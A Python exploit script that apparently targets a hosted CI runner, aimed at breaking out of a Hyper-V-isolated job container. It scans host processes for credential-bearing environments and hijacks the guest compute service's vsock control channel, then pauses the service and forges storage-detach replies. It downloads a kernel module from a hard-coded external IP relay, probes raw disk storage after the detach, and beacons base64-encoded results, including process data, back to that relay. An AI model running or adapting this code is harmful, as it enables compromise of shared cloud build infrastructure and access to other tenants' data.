#!/usr/bin/env python3
"""Forge owned cleanup replies and test one StorVSP target after host detach."""

import base64
import ctypes
import fcntl
import glob
import hashlib
import json
import os
import re
import signal
import socket
import struct
import subprocess
import time
import urllib.parse
import urllib.request


RELAY = "http://16.146.243.72:8450"
NOTIFY = 0x30100101
MODIFY_REQUEST = 0x10100901
MODIFY_RESPONSE = 0x20100901


def beacon(stage, fields):
    value = {"stage": stage, "time_ns": time.time_ns(), **fields}
    encoded = base64.urlsafe_b64encode(
        json.dumps(value, sort_keys=True, separators=(",", ":")).encode()
    ).decode()
    try:
        urllib.request.urlopen(
            RELAY + "/STORAGE_DETACH?d=" + encoded, timeout=2
        ).read()
    except OSError:
        pass


def process_census():
    result = {}
    for name in os.listdir("/hostproc"):
        if not name.isdigit():
            continue
        try:
            command = open(f"/hostproc/{name}/cmdline", "rb").read()
            environment = dict(
                item.split(b"=", 1)
                for item in open(f"/hostproc/{name}/environ", "rb").read().split(b"\0")
                if b"=" in item
            )
        except OSError:
            continue
        if command.startswith(b"/bin/gcs\0"):
            result["gcs"] = int(name)
        if b"scheduler_api_url" in environment and b"jwt_token" in environment:
            result["hca"] = int(name)
    return result


def owned_job_id():
    pid = os.getpid()
    while pid > 1:
        try:
            executable = os.readlink(f"/hostproc/{pid}/exe")
            match = re.search(r"/run/gcs/c/([0-9a-f]{64})/rootfs/", executable)
            if match:
                return match.group(1)
            status = open(f"/hostproc/{pid}/status").read()
            pid = int(next(line.split()[1] for line in status.splitlines()
                           if line.startswith("PPid:")))
        except (OSError, StopIteration, ValueError):
            break
    candidates = []
    for path in glob.glob("/hostrun/runc/*/state.json"):
        try:
            state = json.load(open(path))
            pid = int(state["init_process_pid"])
            environment = open(f"/hostproc/{pid}/environ", "rb").read()
        except (OSError, ValueError, KeyError):
            continue
        if b"GITHUB_ACTIONS=true" in environment or b"GITHUB_RUN_ID=" in environment:
            candidates.append(str(state["id"]))
    if len(candidates) != 1:
        raise RuntimeError(f"job container census was not unique: {len(candidates)}")
    return candidates[0]


def gcs_channel(pid):
    libc = ctypes.CDLL(None, use_errno=True)
    pidfd = os.pidfd_open(pid)
    try:
        for target_fd in range(64):
            duplicate = libc.syscall(438, pidfd, target_fd, 0)
            if duplicate < 0:
                continue
            try:
                channel = socket.socket(fileno=duplicate)
                if (channel.family == socket.AF_VSOCK and
                        channel.getpeername() == (2, 0x40000000)):
                    return target_fd, channel
                channel.close()
            except OSError:
                os.close(duplicate)
    finally:
        os.close(pidfd)
    raise RuntimeError("GCS control channel unavailable")


def send(channel, message_type, request_id, value):
    body = json.dumps(value, separators=(",", ":")).encode()
    channel.sendall(struct.pack("<IIQ", message_type, 16 + len(body), request_id) + body)


def recv_exact(channel, size):
    value = bytearray()
    while len(value) < size:
        part = channel.recv(size - len(value))
        if not part:
            raise EOFError
        value.extend(part)
    return bytes(value)


def storage_target():
    device = os.path.realpath("/hostsys/block/sdc/device")
    address = os.path.basename(device)
    port, path_id, target, lun = map(int, address.split(":"))
    vmbus_ids = {
        os.path.basename(item) for item in glob.glob("/hostsys/bus/vmbus/devices/*")
    }
    controller = next((part for part in device.split("/") if part in vmbus_ids), "")
    if not controller:
        raise RuntimeError("StorVSP controller unavailable")
    return controller, port, path_id, target, lun


def probe(module, controller, port, path_id, target, lun, mode, size, blocks,
          lba=0, expected="-"):
    environment = os.environ.copy()
    environment.update({
        "KCORE_FAST": "1", "VSTOR_LBA": str(lba), "VSTOR_BLOCKS": str(blocks),
        "VSTOR_BYTES": str(size), "VSTOR_PATH": str(path_id),
        "VSTOR_TARGET": str(target), "VSTOR_LUN": str(lun),
        "VSTOR_EXPECT_SHA256": expected,
    })
    try:
        result = subprocess.run(
            ["python3", "/tmp/kcore_relid_load.py", module, str(mode),
             controller, str(port)],
            env=environment, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, timeout=12,
        )
    except subprocess.TimeoutExpired as error:
        captured = error.stdout or ""
        if isinstance(captured, bytes):
            captured = captured.decode(errors="replace")
        return {"mode": mode, "rc": "timeout", "transport": "",
                "data": captured[-120:]}
    lines = result.stdout.splitlines()
    transport = next(
        (line.removeprefix("MODULE_REPORT ") for line in lines
         if line.startswith(("MODULE_REPORT scsi:", "scsi:"))), ""
    )
    data = next((line.removeprefix("VSTOR_DATA ") for line in lines
                 if line.startswith("VSTOR_DATA ")), "")
    return {"mode": mode, "rc": result.returncode,
            "transport": transport[-240:], "data": data[:120]}


def owned_marker(sector_size):
    path = "/tmp/storage-detach-owned-marker"
    payload = (b"STORAGE-DETACH-OWNED\0" + os.urandom(64)).ljust(4096, b"Q")
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    try:
        os.write(fd, payload)
        os.fsync(fd)
    finally:
        os.close(fd)
    fd = os.open(path, os.O_RDONLY)
    try:
        mapping = bytearray(32 + 56 * 8)
        struct.pack_into("<QQIIII", mapping, 0, 0, 4096, 0, 0, 8, 0)
        fcntl.ioctl(fd, 0xC020660B, mapping, True)
    finally:
        os.close(fd)
    if struct.unpack_from("<I", mapping, 20)[0] < 1:
        raise RuntimeError("owned marker has no FIEMAP extent")
    logical, physical, length = struct.unpack_from("<QQQ", mapping, 32)
    if logical or length < 4096 or physical % sector_size:
        raise RuntimeError("owned marker extent did not validate")
    return physical // sector_size, 4096 // sector_size, hashlib.sha256(payload).hexdigest()


state = process_census()
print(f"STORAGE_CONTROL census={state}", flush=True)
if not all(name in state for name in ("gcs", "hca")):
    raise SystemExit("required infrastructure process unavailable")

# Keep the duplicate control socket and this probe in the still-live HCA netns.
try:
    os.setns(os.open(f"/hostproc/{state['hca']}/ns/net", os.O_RDONLY))
except (AttributeError, OSError):
    pass
print("STORAGE_CONTROL hca-netns=true", flush=True)

job_id = owned_job_id()
print(f"STORAGE_CONTROL job={job_id[:12]}", flush=True)
fd, channel = gcs_channel(state["gcs"])
print(f"STORAGE_CONTROL gcs-fd={fd}", flush=True)
channel.settimeout(0.5)
controller, port, path_id, target, lun = storage_target()
print(f"STORAGE_CONTROL target={controller}/{port}:{path_id}:{target}:{lun}", flush=True)
sector_size = int(open("/hostsys/block/sdc/queue/logical_block_size").read())
marker_lba, marker_blocks, marker_sha256 = owned_marker(sector_size)
print(f"STORAGE_CONTROL marker={marker_lba}/{marker_sha256}", flush=True)
module = "/tmp/hvraw_vstor.ko"
urllib.request.urlretrieve(RELAY + "/hvraw_vstor.ko", module)
print("STORAGE_CONTROL module=true", flush=True)
before = [
    probe(module, controller, port, path_id, target, lun, 64, 36, 1),
    probe(module, controller, port, path_id, target, lun, 61, 4096,
          marker_blocks, marker_lba, marker_sha256),
]
print(f"STORAGE_CONTROL before={before}", flush=True)
beacon("pre", {"job": job_id[:12], "gcs_fd": fd, "controller": controller,
               "address": f"{port}:{path_id}:{target}:{lun}",
               "marker_lba": marker_lba, "marker_sha256": marker_sha256,
               "probes": before})

os.kill(state["gcs"], signal.SIGSTOP)
send(channel, NOTIFY, 0, {"ContainerId": job_id, "Type": "UnexpectedExit",
                          "Operation": "StorageDetachControl", "Result": 0})
print("STORAGE_CONTROL notification=true", flush=True)
beacon("notification", {"job": job_id[:12]})

seen = 0
acked_scsi = None
acked_scsi_at = None
post = []
deadline = time.monotonic() + 55
while time.monotonic() < deadline:
    try:
        header = recv_exact(channel, 16)
        message_type, message_size, request_id = struct.unpack("<IIQ", header)
        if not 16 <= message_size <= (1 << 20):
            raise RuntimeError(f"invalid GCS frame {message_size}")
        body = recv_exact(channel, message_size - 16)
    except socket.timeout:
        if (acked_scsi and not post and
                time.monotonic() - acked_scsi_at >= 1.0):
            post.append({"after": acked_scsi, "trigger": "wait", "probes": [
                probe(module, controller, port, path_id, target, lun, 64, 36, 1),
                probe(module, controller, port, path_id, target, lun, 61, 4096,
                      marker_blocks, marker_lba, marker_sha256),
            ]})
            beacon("post", post[-1])
        continue
    except (EOFError, OSError, RuntimeError) as error:
        beacon("channel-end", {"seen": seen, "error": type(error).__name__,
                               "post": post})
        break

    seen += 1
    try:
        value = json.loads(body)
    except ValueError:
        value = {}
    resource = str(value.get("ResourceType", ""))
    request_type = str(value.get("RequestType", ""))
    settings = value.get("Settings", {}) if isinstance(value.get("Settings"), dict) else {}
    current = {
        "seen": seen, "type": hex(message_type), "id": request_id,
        "resource": resource, "request": request_type,
        "controller": settings.get("Controller"), "lun": settings.get("Lun"),
    }
    beacon("host-request", current)
    if acked_scsi:
        post.append({"after": acked_scsi, "trigger": current, "probes": [
            probe(module, controller, port, path_id, target, lun, 64, 36, 1),
            probe(module, controller, port, path_id, target, lun, 61, 4096,
                  marker_blocks, marker_lba, marker_sha256),
        ]})
        beacon("post", post[-1])
        break
    if message_type != MODIFY_REQUEST:
        beacon("unexpected-request", current)
        break
    send(channel, MODIFY_RESPONSE, request_id, {"Result": 0})
    if resource == "SCSIDevice" and request_type == "Remove":
        acked_scsi = current
        acked_scsi_at = time.monotonic()
        beacon("scsi-acked", current)

beacon("done", {"seen": seen, "acked_scsi": acked_scsi, "post": post})
